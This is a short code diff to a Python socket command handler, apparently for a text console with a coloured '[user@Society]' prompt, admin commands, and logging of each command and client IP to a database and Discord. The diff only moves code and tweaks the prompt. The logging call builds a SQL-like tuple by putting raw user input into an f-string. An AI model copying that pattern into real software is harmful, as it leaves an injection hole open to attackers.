@@ -97,9 +97,7 @@ def CMDHandler(socket, addr):
         elif "admin" in data:
             admin_command(socket, addr, data)
 
-    
-    socket.send(str(f"\x1b[34m╔═[{Strings.CurrentUser}@Society]\r\n\x1b[34m╚════\x1b[31m➢").encode())
+        socket.send(str(f"\x1b[34m╔═[{Strings.CurrentUser}@Society]\r\n\x1b[34m╚════\x1b[31m➢ ").encode())
 
-    if data != "":
         LogTypes.LogCommand(f"('{Strings.CurrentUser}','{data}','{str(utils.CurrentTime())}')")
         Discord.send_logs(f"[NEW COMMAND]\r\n[User]: {Strings.CurrentUser} | [IP]: {Strings.CurrentIP}\r\n[COMMAND]: {data}")
